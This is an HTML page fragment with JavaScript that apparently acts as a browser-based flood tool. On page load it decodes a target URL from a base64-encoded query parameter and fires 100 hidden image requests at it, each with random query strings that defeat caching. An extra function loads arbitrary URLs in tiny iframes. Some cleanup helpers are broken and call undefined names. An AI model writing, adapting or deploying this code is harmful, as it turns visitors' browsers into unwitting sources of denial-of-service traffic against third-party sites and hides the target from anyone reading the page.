  <div id="container"></div>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
  <script>
    function fetchJsonData(url) {
      return fetch(url)
        .then(response => response.json())
        .then(data => {
          return data; // Return the parsed JSON data
        })
        .catch(error => {
          console.error('Error:', error);
        });
    }

    function name(url) {
      console.log(url); // The parsed JSON object

      // Usage
      // fetchJsonData(url)
      //   .then(result => {
      //     console.log(result); // The parsed JSON object
      //   });

      // Get a reference to the parent element
      var parentElement = document.getElementById("container");

      // Create a new <iframe> element
      var newIframe = document.createElement('iframe');
      // Set attributes for the new <iframe>
      newIframe.width = '10';
      newIframe.height = '10';
      newIframe.src = url;
      // Set the sandbox attribute to isolate the iframe
      newIframe.sandbox = 'allow-same-origin allow-scripts';
      // Append the new div to the parent element
      parentElement.appendChild(newIframe);
    }

    function image(url) {
      for (let i = 0; i < 100; i++) {

        // console.log(url); // The parsed JSON object

        // Usage
        // fetchJsonData(url)
        //   .then(result => {
        //     console.log(result); // The parsed JSON object
        //   });

        // Get a reference to the parent element
        var parentElement = document.getElementById("container");
        const d = new Date();
        let ms = d.getMilliseconds();

        // Create a new <iframe> element
        var element = document.createElement('img');
        // Set attributes for the new <iframe>
        element.width = '10';
        element.height = '10';
        element.src = url + "?" + makeid(128) + "=" + makeid(128);

        // Append the new div to the parent element
        parentElement.appendChild(element);

      }

    }

    function clean() {
      // Get a reference to the parent element (e.g., the <body>)
      var parentElement = document.body; // You can replace this with another parent element if needed
      el('iframe')
      el('img')
    }

    function remove(el) {
      // Remove all <iframe> elements from the parent
      var iframes = parentElement.getElementsByTagName(el);
      for (var i = iframes.length - 1; i >= 0; i--) {
        iframes[i].parentNode.removeChild(iframes[i]);
      }
    }

    function build(url) {
      console.log(url)
      var qs = new URLSearchParams(url);

      if (!qs.has('e')) {
        return
      }

      e = qs.get('e');      // v1，不存在則得到 null
      // console.log(e)
      var decodedData = CryptoJS.enc.Base64.parse(e).toString(CryptoJS.enc.Utf8);
      var obj = JSON.parse(decodedData)
      // console.log(obj.url)

      image(obj.url)

      // Usage
      // fetchJsonData('image.json')
      //   .then(result => {
      //     // result.url.map(image);
      //     image(result.url)
      //   });
    }


    function makeid(length) {
      let result = '';
      const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
      const charactersLength = characters.length;
      let counter = 0;
      while (counter < length) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
        counter += 1;
      }
      return result;
    }

    build(window.location.search);
